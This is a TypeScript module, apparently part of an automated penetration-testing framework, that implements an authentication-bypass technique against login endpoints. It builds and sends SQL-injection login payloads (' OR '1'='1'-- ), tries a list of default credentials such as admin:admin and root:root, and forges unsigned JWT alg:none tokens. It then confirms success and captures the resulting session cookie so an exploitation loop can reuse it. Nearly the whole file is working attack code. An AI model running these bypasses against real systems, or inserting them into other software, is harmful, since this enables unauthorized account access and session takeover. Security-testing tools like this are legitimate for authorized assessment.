/**
 * authBypass primitive (WS-B depth)
 *
 * Three authentication-bypass techniques against a login/auth endpoint:
 *   1. SQLi login bypass — ' OR '1'='1'-- style credentials.
 *   2. Default credentials — common admin:admin / root:root pairs.
 *   3. JWT alg:none forgery — replay a forged unsigned token (when a sample
 *      token is supplied via input.metadata.sampleToken).
 *
 * Oracle: a success signal (2xx/3xx + session cookie OR welcome/dashboard body)
 * and absence of error markers => authentication bypass confirmed.
 */
import type {
  TechniquePrimitive,
  TechniqueContext,
  PrimitiveResult,
  StepExecutionResult,
} from './framework'
import { EvidenceGate } from '../intelligence/evidence-gate'
import { claimFor, assessAccess } from './framework'
import { isAuthEndpoint, hasTarget } from './routing'
import { getPayloadStore } from '../payloads/store'

interface AuthStepMeta {
  technique: 'sqli-login' | 'default-creds' | 'jwt-none'
  payload?: string
  user?: string
  pass?: string
}

const DEFAULT_CREDS = (): Array<[string, string]> => {
  const raw = getPayloadStore().getPayloads('auth/default-creds', 'default_creds')
  if (raw.length === 0) {
    return [['admin', 'admin'], ['admin', 'password'], ['root', 'root'], ['administrator', 'administrator'], ['test', 'test'], ['guest', 'guest']]
  }
  return raw.map((entry) => {
    const parts = entry.split(':')
    return [parts[0] ?? 'admin', parts[1] ?? ''] as [string, string]
  })
}

function b64url(input: Buffer | string): string {
  return Buffer.from(input).toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '')
}

function forgeAlgNone(token: string): string | null {
  const parts = token.split('.')
  if (parts.length < 2) return null
  const payload = parts[1]
  // Pad for atob-style decode safety.
  const pad = payload.length % 4 === 0 ? '' : '='.repeat(4 - (payload.length % 4))
  try {
    JSON.parse(Buffer.from(payload + pad.replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString('utf8'))
  } catch {
    return null
  }
  const header = b64url(JSON.stringify({ alg: 'none', typ: 'JWT' }))
  return `${header}.${payload}.`
}

function metaKind(r: StepExecutionResult): 'login' | 'jwt-forgery' | 'default-creds' {
  const technique = (r.step.metadata as AuthStepMeta | undefined)?.technique
  if (technique === 'jwt-none') return 'jwt-forgery'
  if (technique === 'default-creds') return 'default-creds'
  return 'login'
}

function hashCreds(body?: string): string | undefined {
  if (!body) return undefined
  try {
    const h = require('node:crypto').createHash('sha256')
    h.update(body)
    return h.digest('hex').slice(0, 16)
  } catch {
    return undefined
  }
}

function successSignal(res: StepExecutionResult): boolean {
  // Status-authoritative: a 2xx/3xx with a session cookie, a non-login
  // redirect, or any success marker counts as granted; a denial page (401/403
  // or error copy) counts as denied. Keyword copy is a secondary signal, so a
  // custom localized login page is still assessed correctly.
  const a = assessAccess({
    status: res.status,
    body: res.body,
    setCookie: String(res.headers?.['set-cookie'] ?? res.headers?.['Set-Cookie'] ?? ''),
    denyMarkers: ['invalid', 'incorrect', 'authentication failed', 'wrong user', 'wrong password'],
    successMarkers: ['welcome', 'dashboard', 'logout'],
    grantsOn2xx: false,
  })
  return a.granted && !a.denied
}

export const authBypass: TechniquePrimitive = {
  id: 'authBypass',
  name: 'Authentication Bypass',
  description:
    'Attempts authentication bypass via SQLi login, default credentials, and JWT alg:none forgery.',
  technique: 'AUTHN_BYPASS',
  appliesTo: (ctx) =>
    hasTarget(ctx) && isAuthEndpoint(ctx),
  generate(input: TechniqueContext) {
    const url = input.endpoint?.url ?? input.target!
    const param = input.param ?? input.endpoint?.params?.[0]?.name
    const method = input.endpoint?.method ?? 'POST'
    const headers = { ...(input.sessionHeaders ?? {}) }
    const out: any[] = []

    // 1. SQLi login bypass.
    out.push({
      id: 'sqli-login',
      description: 'SQLi login bypass with OR 1=1 credential',
      request: {
        method: method === 'GET' ? 'POST' : method,
        url,
        headers: { ...headers, 'content-type': 'application/json' },
        body: JSON.stringify({ user: "' OR '1'='1'-- ", username: "' OR '1'='1'-- ", password: 'x', [param ?? 'user']: "' OR '1'='1'-- " }),
      },
      expectedSignal: 'successful login without valid credentials',
      metadata: { technique: 'sqli-login', payload: "' OR '1'='1'-- " } as AuthStepMeta,
    })

    // 2. Default credentials.
    DEFAULT_CREDS().forEach(([u, p], i) => {
      out.push({
        id: `default-creds-${i}`,
        description: `Default credentials ${u}:${p}`,
        request: {
          method: method === 'GET' ? 'POST' : method,
          url,
          headers: { ...headers, 'content-type': 'application/json' },
          body: JSON.stringify({ user: u, username: u, password: p, [param ?? 'user']: u, [param ? `${param}pass` : 'pass']: p }),
        },
        expectedSignal: 'login succeeds with default credentials',
        metadata: { technique: 'default-creds', user: u, pass: p } as AuthStepMeta,
      })
    })

    // 3. JWT alg:none (only when a sample token is supplied).
    const sample = (input.metadata as any)?.sampleToken as string | undefined
    if (sample) {
      const forged = forgeAlgNone(sample)
      if (forged) {
        out.push({
          id: 'jwt-none',
          description: 'JWT alg:none forged token replay',
          request: {
            method: 'GET',
            url,
            headers: { ...headers, authorization: `Bearer ${forged}` },
          },
          expectedSignal: 'endpoint accepts unsigned alg:none token',
          metadata: { technique: 'jwt-none', payload: forged } as AuthStepMeta,
        })
      }
    }

    return out as any
  },
  async oracle(results: StepExecutionResult[], evidenceGate: EvidenceGate): Promise<PrimitiveResult> {
    const evidence: PrimitiveResult['evidence'] = []
    let hit = false
    const techniques: string[] = []
    let winning: StepExecutionResult | undefined

    for (const r of results) {
      const meta = r.step.metadata as unknown as AuthStepMeta
      if (successSignal(r)) {
        hit = true
        if (!winning) winning = r
        if (!techniques.includes(meta.technique)) techniques.push(meta.technique)
        const label =
          meta.technique === 'default-creds'
            ? `Auth bypass via default creds ${meta.user}:${meta.pass}`
            : meta.technique === 'jwt-none'
              ? 'Auth bypass via JWT alg:none'
              : 'Auth bypass via SQLi login'
        evidence.push({
          kind: 'state',
          label: `${label} [${r.step.request.method} ${r.step.request.url} → ${r.status}]`,
          data: (r.body ?? '').slice(0, 1200),
        })
      }
    }

    const { verified } = evidenceGate.verifyClaim(
      claimFor('auth_bypass', results[0]?.step.request.url, results[0]?.status, results[0]?.step.request.method),
    )
    const confirmed = hit && verified

    // W2 — recover the live session so it can be persisted (AUTH_FLOW,
    // reusable) and reused by the exploitation loop to pivot in-scope.
    let sessionArtifact: PrimitiveResult['sessionArtifact']
    if (confirmed && winning) {
      const setCookie = String(
        winning.headers?.['set-cookie'] ?? winning.headers?.['Set-Cookie'] ?? '',
      )
      const cookie = setCookie
        .split(/,(?=[^ ])/)
        .map((c) => c.split(';')[0])
        .filter(Boolean)
        .join('; ')
      if (cookie) {
        sessionArtifact = {
          flowType: metaKind(winning),
          reusable: true,
          headers: { ...winning.step.request.headers, cookie },
          credentialHash: hashCreds(winning.step.request.body),
        }
      }
    }

    const proof =
      confirmed && winning
        ? {
            scenario: `Authentication bypass via: ${techniques.join(', ')}`,
            request: `${winning.step.request.method} ${winning.step.request.url}${winning.step.request.body ? `\n\n${winning.step.request.body}` : ''}`,
            response: `HTTP ${winning.status ?? 0}\n${(winning.body ?? '').slice(0, 800)}`,
            impact: 'Obtained an authenticated session as a privileged actor without valid credentials.',
          }
        : undefined
    return {
      confirmed,
      confidence: confirmed ? 0.9 : hit ? 0.5 : 0.05,
      evidence,
      severity: confirmed ? 'critical' : undefined,
      finding: confirmed
        ? {
            category: 'auth_bypass',
            description: `Authentication bypass via: ${techniques.join(', ')} on ${results[0]?.step.request.url ?? ''}.`,
            request: results[0]?.step.request,
            response: { status: results[0]?.status ?? 0, body: '' },
            cwe: 'CWE-287',
          }
        : undefined,
      exploitProof: proof,
      sessionArtifact,
      note: `hit=${hit} verified=${verified} techniques=${techniques.join(',')}`,
    }
  },
}
